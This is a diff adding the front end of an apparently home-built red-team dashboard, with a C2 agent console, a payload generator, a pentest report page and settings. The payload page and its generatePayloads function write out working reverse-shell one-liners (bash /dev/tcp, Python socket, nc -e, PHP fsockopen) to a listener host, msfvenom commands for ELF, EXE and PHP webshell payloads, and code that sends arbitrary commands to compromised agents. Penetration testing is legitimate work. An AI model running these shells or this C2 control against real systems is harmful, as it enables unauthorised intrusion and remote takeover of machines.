+          <div class="terminal-input">
+            <span id="shell-prompt" style="color:var(--red)">c2 $</span>
+            <input type="text" id="agent-cmd" placeholder="select agent first..." onkeydown="sendAgentCmd(event)" disabled>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAYLOADS PAGE -->
+    <div id="page-payloads" style="display:none">
+      <div class="page-header">
+        <div>
+          <div class="page-title">PAYLOAD GENERATOR</div>
+          <div class="page-subtitle">Generate reverse shells and compiled payloads</div>
+        </div>
+      </div>
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot"></div>REVERSE SHELLS</div></div>
+          <div class="panel-body">
+            <div style="margin-bottom:12px">
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">LHOST</label>
+              <input id="gen-lhost" type="text" value="192.168.133.128" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div style="margin-bottom:16px">
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">LPORT</label>
+              <input id="gen-lport" type="text" value="4444" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div style="display:flex;flex-direction:column;gap:8px" id="payload-output">
+              <div style="background:var(--bg3);border:1px solid var(--border);padding:12px">
+                <div style="font-size:10px;color:var(--red);letter-spacing:1px;margin-bottom:6px">BASH</div>
+                <div style="font-size:11px;color:var(--green);word-break:break-all" id="p-bash">bash -i &gt;&amp; /dev/tcp/192.168.133.128/4444 0&gt;&amp;1</div>
+              </div>
+              <div style="background:var(--bg3);border:1px solid var(--border);padding:12px">
+                <div style="font-size:10px;color:var(--red);letter-spacing:1px;margin-bottom:6px">PYTHON</div>
+                <div style="font-size:11px;color:var(--green);word-break:break-all" id="p-python">python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.133.128",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</div>
+              </div>
+              <div style="background:var(--bg3);border:1px solid var(--border);padding:12px">
+                <div style="font-size:10px;color:var(--red);letter-spacing:1px;margin-bottom:6px">NETCAT</div>
+                <div style="font-size:11px;color:var(--green)" id="p-nc">nc -e /bin/sh 192.168.133.128 4444</div>
+              </div>
+              <div style="background:var(--bg3);border:1px solid var(--border);padding:12px">
+                <div style="font-size:10px;color:var(--red);letter-spacing:1px;margin-bottom:6px">PHP</div>
+                <div style="font-size:11px;color:var(--green);word-break:break-all" id="p-php">php -r '$sock=fsockopen("192.168.133.128",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</div>
+              </div>
+            </div>
+            <button class="btn btn-red" style="margin-top:12px;width:100%" onclick="generatePayloads()">↺ REGENERATE</button>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot yellow"></div>MSFVENOM COMMANDS</div></div>
+          <div class="panel-body" style="display:flex;flex-direction:column;gap:8px">
+            <div style="background:var(--bg3);border:1px solid var(--border);padding:12px">
+              <div style="font-size:10px;color:var(--yellow);letter-spacing:1px;margin-bottom:6px">LINUX ELF</div>
+              <div style="font-size:11px;color:var(--text);word-break:break-all" id="msf-linux">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.133.128 LPORT=4444 -f elf -o shell.elf</div>
+            </div>
+            <div style="background:var(--bg3);border:1px solid var(--border);padding:12px">
+              <div style="font-size:10px;color:var(--yellow);letter-spacing:1px;margin-bottom:6px">WINDOWS EXE</div>
+              <div style="font-size:11px;color:var(--text);word-break:break-all" id="msf-win">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.133.128 LPORT=4444 -f exe -o shell.exe</div>
+            </div>
+            <div style="background:var(--bg3);border:1px solid var(--border);padding:12px">
+              <div style="font-size:10px;color:var(--yellow);letter-spacing:1px;margin-bottom:6px">PHP WEBSHELL</div>
+              <div style="font-size:11px;color:var(--text);word-break:break-all" id="msf-php">msfvenom -p php/reverse_php LHOST=192.168.133.128 LPORT=4444 -f raw -o shell.php</div>
+            </div>
+            <div style="background:var(--bg3);border:1px solid var(--border);padding:12px">
+              <div style="font-size:10px;color:var(--blue);letter-spacing:1px;margin-bottom:6px">LISTENER</div>
+              <div style="font-size:11px;color:var(--text)">nc -lvnp 4444</div>
+              <div style="font-size:11px;color:var(--text-dim);margin-top:4px">or: msfconsole → use exploit/multi/handler</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- REPORT PAGE -->
+    <div id="page-report" style="display:none">
+      <div class="page-header">
+        <div>
+          <div class="page-title">REPORT GENERATOR</div>
+          <div class="page-subtitle">Auto-generate professional PDF pentest report</div>
+        </div>
+        <button class="btn btn-red btn-glow" onclick="generateReport()">▤ GENERATE PDF</button>
+      </div>
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot"></div>REPORT CONFIG</div></div>
+          <div class="panel-body" style="display:flex;flex-direction:column;gap:12px">
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">TESTER NAME</label>
+              <input id="r-tester" type="text" placeholder="Your Name" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">COMPANY / CLIENT</label>
+              <input id="r-company" type="text" placeholder="Target Organization" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">TARGET</label>
+              <input id="r-target" type="text" placeholder="IP or Domain" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <button class="btn btn-red" style="width:100%;margin-top:4px" onclick="generateReport()">GENERATE REPORT</button>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot green"></div>REPORT SUMMARY</div></div>
+          <div class="panel-body">
+            <div id="report-summary" style="font-size:12px;line-height:2;color:var(--text-dim)">
+              Complete all assessment phases before generating report.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SETTINGS PAGE -->
+    <div id="page-settings" style="display:none">
+      <div class="page-header">
+        <div>
+          <div class="page-title">SETTINGS</div>
+          <div class="page-subtitle">Configure target and API keys</div>
+        </div>
+        <button class="btn btn-red" onclick="saveSettings()">✓ SAVE</button>
+      </div>
+      <div class="grid-2">
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot"></div>TARGET CONFIG</div></div>
+          <div class="panel-body" style="display:flex;flex-direction:column;gap:12px">
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">TARGET DOMAIN</label>
+              <input id="s-domain" type="text" placeholder="target-domain.com" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">TARGET IP</label>
+              <input id="s-ip" type="text" placeholder="XX.XX.XX.XX" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">TARGET URL</label>
+              <input id="s-url" type="text" placeholder="http://target-domain.com" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">KALI IP (YOUR IP)</label>
+              <input id="s-kali" type="text" placeholder="192.168.x.x" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">SUBNET</label>
+              <input id="s-subnet" type="text" placeholder="XX.XX.XX.0/24" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="panel-header"><div class="panel-header-left"><div class="panel-dot yellow"></div>API KEYS</div></div>
+          <div class="panel-body" style="display:flex;flex-direction:column;gap:12px">
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">SHODAN API KEY</label>
+              <input id="s-shodan" type="password" placeholder="••••••••••••••••" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">GITHUB TOKEN (optional)</label>
+              <input id="s-github" type="password" placeholder="••••••••••••••••" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div>
+              <label style="font-size:11px;color:var(--text-dim);letter-spacing:1px">C2 SERVER</label>
+              <input id="s-c2" type="text" value="http://127.0.0.1:8080" style="display:block;width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:7px 10px;font-family:var(--mono);font-size:12px;margin-top:4px;outline:none">
+            </div>
+            <div style="margin-top:8px;padding:12px;background:var(--bg3);border:1px solid var(--green-dim)">
+              <div style="font-size:11px;color:var(--green);margin-bottom:6px">⚠ SECURITY NOTE</div>
+              <div style="font-size:11px;color:var(--text-dim);line-height:1.8">Settings are stored in browser localStorage only. Never commit API keys to GitHub.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script>
+// ========================
+// STATE
+// ========================
+let state = {
+  target: localStorage.getItem('rtf_target_ip') || 'NOT SET',
+  domain: localStorage.getItem('rtf_domain') || '',
+  recon: JSON.parse(localStorage.getItem('rtf_recon') || 'null'),
+  exploit: JSON.parse(localStorage.getItem('rtf_exploit') || 'null'),
+  post: JSON.parse(localStorage.getItem('rtf_post') || 'null'),
+  agents: {},
+  activeAgent: null,
+  c2url: localStorage.getItem('rtf_c2') || 'http://192.168.206.128:8080'
+};
+
+// ========================
+// CLOCK
+// ========================
+function updateClock() {
+  const now = new Date();
+  document.getElementById('clock').textContent =
+    now.toTimeString().split(' ')[0];
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+// ========================
+// NAVIGATION
+// ========================
+function showPage(name) {
+  document.querySelectorAll('[id^="page-"]').forEach(p => p.style.display = 'none');
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('page-' + name).style.display = 'block';
+  event.currentTarget.classList.add('active');
+
+  if (name === 'c2') refreshAgents();
+  if (name === 'overview') loadResults();
+}
+
+// ========================
+// TERMINAL
+// ========================
+function log(msg, type='out') {
+  const term = document.getElementById('main-terminal');
+  const now = new Date().toTimeString().split(' ')[0];
+  const div = document.createElement('div');
+  div.className = 't-line';
+
+  const typeMap = {
+    out: 't-out', cmd: 't-cmd', warn: 't-warn',
+    err: 't-err', info: 't-info'
+  };
+
+  div.innerHTML = `<span class="t-time">${now}</span><span class="${typeMap[type] || 't-out'}">${msg}</span>`;
+  term.appendChild(div);
+  term.scrollTop = term.scrollHeight;
+}
+
+function clearTerminal() {
+  document.getElementById('main-terminal').innerHTML = '';
+  log('Terminal cleared', 'info');
+}
+
+function handleCmd(e) {
+  if (e.key !== 'Enter') return;
+  const input = document.getElementById('cmd-input');
+  const cmd = input.value.trim();
+  if (!cmd) return;
+  log(`RTF $ ${cmd}`, 'cmd');
+
+  const cmds = {
+    'help': () => {
+      log('Commands: status, agents, clear, target, phases', 'info');
+    },
+    'status': () => {
+      log(`Target: ${state.target}`, 'out');
+      log(`Recon: ${state.recon ? 'COMPLETE' : 'PENDING'}`, state.recon ? 'cmd' : 'warn');
+      log(`Exploit: ${state.exploit ? 'COMPLETE' : 'PENDING'}`, state.exploit ? 'cmd' : 'warn');
+    },
+    'agents': () => {
+      const count = Object.keys(state.agents).length;
+      log(`Connected agents: ${count}`, count > 0 ? 'cmd' : 'warn');
+    },
+    'clear': clearTerminal,
+    'target': () => log(`Current target: ${state.target}`, 'info'),
+  };
+
+  if (cmds[cmd]) cmds[cmd]();
+  else log(`Unknown command: ${cmd}. Type 'help' for options.`, 'warn');
+
+  input.value = '';
+}
+
+// ========================
+// LOAD RESULTS FROM JSON
+// ========================
+async function loadResults() {
+  try {
+    // Try to load recon results
+    const r = await fetch('/results/recon');
+    if (r.ok) {
+      state.recon = await r.json();
+      updateReconUI();
+    }
+  } catch(e) {}
+
+  try {
+    const e = await fetch('/results/exploit');
+    if (e.ok) {
+      state.exploit = await e.json();
+      updateExploitUI();
+    }
+  } catch(e) {}
+
+  try {
+    const p = await fetch('/results/post');
+    if (p.ok) {
+      state.post = await p.json();
+      updatePostUI();
+    }
+  } catch(e) {}
+
+  updateOverviewStats();
+}
+
+function updateOverviewStats() {
+  const recon = state.recon?.recon || {};
+  const exploit = state.exploit || {};
+  const post = state.post || {};
+
+  const subCount = (recon.subdomains || []).length;
+  const portCount = (recon.ports || []).length;
+  const vulns = exploit.vulnerabilities || {};
+  const cveCount = Object.values(vulns).flat().length;
+  const dirCount = (exploit.dirs || []).length;
+
+  document.getElementById('stat-subdomains').textContent = subCount;
+  document.getElementById('stat-ports').textContent = portCount;
+  document.getElementById('stat-cves').textContent = cveCount;
+  document.getElementById('stat-dirs').textContent = dirCount;
+
+  document.getElementById('badge-recon').textContent = subCount + portCount;
+  document.getElementById('badge-exploit').textContent = cveCount;
+  document.getElementById('badge-post').textContent =
+    (post.privesc?.suid_exploitable || []).length;
+
+  // Risk score
+  const score = Math.min(100, cveCount * 8 + dirCount * 3 + subCount);
+  document.getElementById('risk-score').textContent = score || '--';
+
+  // Progress bars
+  const maxBar = Math.max(cveCount, 1);
+  let critical = 0, high = 0, medium = 0, low = 0;
+
+  Object.values(vulns).flat().forEach(v => {
+    const sev = (v.severity || '').toUpperCase();
+    if (sev === 'CRITICAL') critical++;
+    else if (sev === 'HIGH') high++;
+    else if (sev === 'MEDIUM') medium++;
+    else low++;
+  });
+
+  document.getElementById('prog-critical').textContent = critical;
+  document.getElementById('prog-high').textContent = high;
+  document.getElementById('prog-medium').textContent = medium;
+  document.getElementById('prog-low').textContent = low;
+
+  const total = critical + high + medium + low || 1;
+  document.getElementById('fill-critical').style.width = (critical/total*100) + '%';
+  document.getElementById('fill-high').style.width = (high/total*100) + '%';
+  document.getElementById('fill-medium').style.width = (medium/total*100) + '%';
+  document.getElementById('fill-low').style.width = (low/total*100) + '%';
+
+  // Findings table
+  const tbody = document.getElementById('findings-tbody');
+  const findings = [];
+
+  Object.entries(vulns).forEach(([svc, cves]) => {
+    cves.forEach(cve => {
+      findings.push({
+        severity: cve.severity || 'MEDIUM',
+        title: cve.cve_id,
+        location: svc,
+        id: cve.cve_id,
+        score: cve.score
+      });
+    });
+  });
+
+  (exploit.dirs || []).forEach(d => {
+    findings.push({
+      severity: d.status === 200 ? 'MEDIUM' : 'LOW',
+      title: 'Exposed Directory',
+      location: d.url,
+      id: 'WEB-DIR',
+      score: d.status
+    });
+  });
+
+  document.getElementById('findings-count').textContent = `${findings.length} findings`;
+
+  if (findings.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No findings yet. Run assessment to populate.</td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = findings.map(f => `
+    <tr>
+      <td><span class="badge badge-${f.severity.toLowerCase()}">${f.severity}</span></td>
+      <td style="color:var(--text)">${f.title}</td>
+      <td style="color:var(--text-dim);font-size:11px">${f.location}</td>
+      <td style="color:var(--blue);font-size:11px">${f.id}</td>
+      <td style="color:var(--yellow)">${f.score}</td>
+    </tr>
+  `).join('');
+}
+
+function updateReconUI() {
+  const recon = state.recon?.recon || {};
+  const subs = recon.subdomains || [];
+  const ports = recon.ports || [];
+
+  document.getElementById('sub-count').textContent = `${subs.length} found`;
+  document.getElementById('port-count').textContent = `${ports.length} found`;
+
+  document.getElementById('subdomain-tbody').innerHTML = subs.length ?
+    subs.map(s => `<tr><td style="color:var(--green)">${s}</td><td><span class="badge badge-open">FOUND</span></td></tr>`).join('') :
+    '<tr><td colspan="2" style="text-align:center;padding:20px;color:var(--text-dim)">No subdomains</td></tr>';
+
+  document.getElementById('ports-tbody').innerHTML = ports.length ?
+    ports.map(p => `
+      <tr>
+        <td style="color:var(--blue)">${p.port}</td>
+        <td style="color:var(--text)">${p.service}</td>
+        <td style="color:var(--text-dim);font-size:11px">${p.version || '-'}</td>
+        <td><span class="badge badge-open">${p.state}</span></td>
+      </tr>`).join('') :
+    '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-dim)">No ports</td></tr>';
+
+  const shodan = recon.shodan;
+  if (shodan) {
+    document.getElementById('shodan-data').innerHTML = `
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;font-size:12px">
+        <div><span style="color:var(--text-dim)">ORG: </span><span style="color:var(--text)">${shodan.org || 'N/A'}</span></div>
+        <div><span style="color:var(--text-dim)">OS: </span><span style="color:var(--text)">${shodan.os || 'N/A'}</span></div>
+        <div><span style="color:var(--text-dim)">PORTS: </span><span style="color:var(--blue)">${(shodan.ports || []).join(', ')}</span></div>
+        <div><span style="color:var(--text-dim)">VULNS: </span><span style="color:var(--red)">${(shodan.vulns || []).join(', ') || 'None'}</span></div>
+      </div>`;
+  }
+}
+
+function updateExploitUI() {
+  const vulns = state.exploit?.vulnerabilities || {};
+  const dirs = state.exploit?.dirs || [];
+  const allCves = Object.entries(vulns).flatMap(([svc, cves]) =>
+    cves.map(c => ({...c, service: svc})));
+
+  document.getElementById('cve-count').textContent = `${allCves.length} found`;
+
+  document.getElementById('cve-tbody').innerHTML = allCves.length ?
+    allCves.map(c => `
+      <tr>
+        <td style="color:var(--blue);font-size:11px">${c.cve_id}</td>
+        <td style="color:var(--text-dim)">${c.service}</td>
+        <td><span class="badge badge-${(c.severity||'medium').toLowerCase()}">${c.severity||'N/A'}</span></td>
+        <td style="color:var(--yellow)">${c.score||'N/A'}</td>
+        <td style="color:var(--text-dim);font-size:11px">${(c.description||'').substring(0,60)}...</td>
+      </tr>`).join('') :
+    '<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No CVEs found</td></tr>';
+
+  document.getElementById('dirs-tbody').innerHTML = dirs.length ?
+    dirs.map(d => `
+      <tr>
+        <td><span class="badge ${d.status===200?'badge-open':'badge-medium'}">${d.status}</span></td>
+        <td style="color:var(--blue);font-size:11px">${d.url}</td>
+      </tr>`).join('') :
+    '<tr><td colspan="2" style="text-align:center;padding:20px;color:var(--text-dim)">No dirs found</td></tr>';
+}
+
+function updatePostUI() {
+  const suid = state.post?.privesc?.suid_exploitable || [];
+  const crons = state.post?.privesc?.cron_jobs || [];
+
+  document.getElementById('suid-count').textContent = `${suid.length} found`;
+
+  document.getElementById('suid-tbody').innerHTML = suid.length ?
+    suid.map(s => `
+      <tr>
+        <td style="color:var(--red)">${s.binary}</td>
+        <td style="color:var(--yellow);font-size:11px">${s.exploit}</td>
+      </tr>`).join('') :
+    '<tr><td colspan="2" style="text-align:center;padding:20px;color:var(--text-dim)">No exploitable SUID binaries</td></tr>';
+
+  document.getElementById('cron-list').innerHTML = crons.length ?
+    crons.map(c => `<div style="color:var(--text-dim);font-size:11px;padding:4px 0;border-bottom:1px solid var(--border)">${c.location}</div>`).join('') :
+    '<div style="color:var(--text-dim)">No suspicious cron jobs found</div>';
+}
+
+// ========================
+// RUN ASSESSMENT
+// ========================
+async function runFullScan() {
+  log('[*] Starting full assessment...', 'info');
+  log('[*] Phase 1: Recon', 'warn');
+  try {
+    const r = await fetch('/run/recon', {method:'POST'});
+    if (r.ok) log('[+] Recon complete!', 'cmd');
+    else log('[-] Recon failed', 'err');
+  } catch(e) { log(`[-] Cannot reach server: ${e.message}`, 'err'); }
+  setTimeout(() => loadResults(), 1000);
+}
+
+async function runPhase(phase) {
+  log(`[*] Running ${phase} phase...`, 'info');
+  try {
+    const r = await fetch(`/run/${phase}`, {method:'POST'});
+    if (r.ok) {
+      log(`[+] ${phase} complete!`, 'cmd');
+      loadResults();
+    }
+  } catch(e) {
+    log(`[-] Server not reachable. Run python3 dashboard/app.py first`, 'err');
+  }
+}
+
+// ========================
+// C2 AGENTS
+// ========================
+async function refreshAgents() {
+  try {
+    const r = await fetch(`${state.c2url}/agents`);
+    if (r.ok) {
+      state.agents = await r.json();
+      renderAgents();
+    }
+  } catch(e) {
+    document.getElementById('agent-list').innerHTML =
+      '<div style="text-align:center;padding:24px;color:var(--red);font-size:12px">C2 server offline. Run: python3 c2/server.py</div>';
+  }
+}
+
+function renderAgents() {
+  const list = document.getElementById('agent-list');
+  const agents = Object.entries(state.agents);
+  document.getElementById('agent-count-label').textContent = `${agents.length} active`;
+  document.getElementById('badge-agents').textContent = agents.length;
+
+  if (!agents.length) {
+    list.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text-dim);font-size:12px">No agents connected.</div>';
+    return;
+  }
+
+  list.innerHTML = agents.map(([id, info]) => `
+    <div class="agent-card" onclick="selectAgent('${id}')">
+      <div class="agent-indicator"></div>
+      <div class="agent-info">
+        <div class="agent-id">${id}</div>
+        <div class="agent-meta">${info.hostname || 'unknown'} | ${info.os || 'unknown'} | ${info.user || 'unknown'}</div>
+        <div class="agent-meta">Last seen: ${info.last_seen || 'N/A'}</div>
+      </div>
+      <div class="agent-actions">
+        <button class="btn-xs green" onclick="selectAgent('${id}')">SHELL</button>
+        <button class="btn-xs" onclick="sendCmd('${id}', 'sysinfo')">INFO</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function selectAgent(id) {
+  state.activeAgent = id;
+  document.getElementById('active-agent-label').textContent = id;
+  document.getElementById('agent-cmd').disabled = false;
+  document.getElementById('shell-prompt').textContent = `c2(${id}) $`;
+  agentLog(`[*] Connected to agent ${id}`, 'info');
+}
+
+function agentLog(msg, type='out') {
+  const term = document.getElementById('agent-terminal');
+  const div = document.createElement('div');
+  div.className = 't-line';
+  const colors = {out:'t-out', info:'t-info', cmd:'t-cmd', err:'t-err'};
+  div.innerHTML = `<span class="${colors[type]||'t-out'}">${msg}</span>`;
+  term.appendChild(div);
+  term.scrollTop = term.scrollHeight;
+}
+
+async function sendAgentCmd(e) {
+  if (e.key !== 'Enter' || !state.activeAgent) return;
+  const input = document.getElementById('agent-cmd');
+  const cmd = input.value.trim();
+  if (!cmd) return;
+  agentLog(`c2(${state.activeAgent}) $ ${cmd}`, 'cmd');
+  input.value = '';
+  await sendCmd(state.activeAgent, cmd);
+}
+
+async function sendCmd(agentId, cmd) {
+  try {
+    await fetch(`${state.c2url}/cmd`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({agent_id: agentId, command: cmd})
+    });
+    agentLog(`[*] Command sent: ${cmd}`, 'info');
+    setTimeout(() => getResults(agentId), 2500);
+  } catch(e) {
+    agentLog(`[-] Failed to send: ${e.message}`, 'err');
+  }
+}
+
+async function getResults(agentId) {
+  try {
+    const r = await fetch(`${state.c2url}/results/${agentId}`);
+    if (r.ok) {
+      const results = await r.json();
+      if (results.length > 0) {
+        const latest = results[results.length - 1];
+        agentLog(latest.output, 'out');
+      }
+    }
+  } catch(e) {}
+}
+
+// ========================
+// PAYLOAD GENERATOR
+// ========================
+function generatePayloads() {
+  const lhost = document.getElementById('gen-lhost').value;
+  const lport = document.getElementById('gen-lport').value;
+
+  document.getElementById('p-bash').textContent = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  document.getElementById('p-python').textContent = `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+  document.getElementById('p-nc').textContent = `nc -e /bin/sh ${lhost} ${lport}`;
+  document.getElementById('p-php').textContent = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+  document.getElementById('msf-linux').textContent = `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell.elf`;
+  document.getElementById('msf-win').textContent = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o shell.exe`;
+  document.getElementById('msf-php').textContent = `msfvenom -p php/reverse_php LHOST=${lhost} LPORT=${lport} -f raw -o shell.php`;
+}
+
+// ========================
+// REPORT
+// ========================
+async function generateReport() {
+  const tester = document.getElementById('r-tester')?.value || 'Unknown';
+  const company = document.getElementById('r-company')?.value || 'Unknown';
+  const target = document.getElementById('r-target')?.value || state.target;
+
+  log('[*] Generating PDF report...', 'info');
+  try {
+    const r = await fetch('/run/report', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({tester, company, target})
+    });
+    if (r.ok) {
+      log('[+] Report generated: pentest_report.pdf', 'cmd');
+      const el = document.getElementById('report-summary');
+      if (el) {
+        const recon = state.recon?.recon || {};
+        el.innerHTML = `
+          <div style="color:var(--green)">✓ Report generated successfully</div>
+          <br>
+          <div>Subdomains: <span style="color:var(--text)">${(recon.subdomains||[]).length}</span></div>
+          <div>Open Ports: <span style="color:var(--text)">${(recon.ports||[]).length}</span></div>
+          <div>CVEs: <span style="color:var(--red)">${document.getElementById('stat-cves').textContent}</span></div>
+          <div>Exposed Dirs: <span style="color:var(--yellow)">${document.getElementById('stat-dirs').textContent}</span></div>
+          <br>
+          <div style="color:var(--text-dim)">File: pentest_report.pdf</div>
+        `;
+      }
+    }
+  } catch(e) {
+    log(`[-] Server not reachable`, 'err');
+  }
+}
+
+// ========================
+// SETTINGS
+// ========================
+function saveSettings() {
+  const ip = document.getElementById('s-ip').value;
+  const domain = document.getElementById('s-domain').value;
+  const c2 = document.getElementById('s-c2').value;
+
+  localStorage.setItem('rtf_target_ip', ip);
+  localStorage.setItem('rtf_domain', domain);
+  localStorage.setItem('rtf_c2', c2);
+
+  state.target = ip;
+  state.c2url = c2;
+  document.getElementById('target-display').textContent = ip || 'NOT SET';
+
+  log(`[+] Settings saved. Target: ${ip}`, 'cmd');
+  alert('Settings saved!');
+}
+
+// Load saved settings
+function loadSettings() {
+  const ip = localStorage.getItem('rtf_target_ip');
+  const domain = localStorage.getItem('rtf_domain');
+  const c2 = localStorage.getItem('rtf_c2');
+
+  if (document.getElementById('s-ip')) document.getElementById('s-ip').value = ip || '';
+  if (document.getElementById('s-domain')) document.getElementById('s-domain').value = domain || '';
+  if (document.getElementById('s-c2')) document.getElementById('s-c2').value = c2 || 'http://127.0.0.1:8080';
+  if (ip) document.getElementById('target-display').textContent = ip;
+}
+
+// ========================
+// INIT
+// ========================
+document.addEventListener('DOMContentLoaded', () => {
+  loadSettings();
+  loadResults();
+  setInterval(refreshAgents, 10000);
+});
+</script>
+</body>
+</html>
+EOF
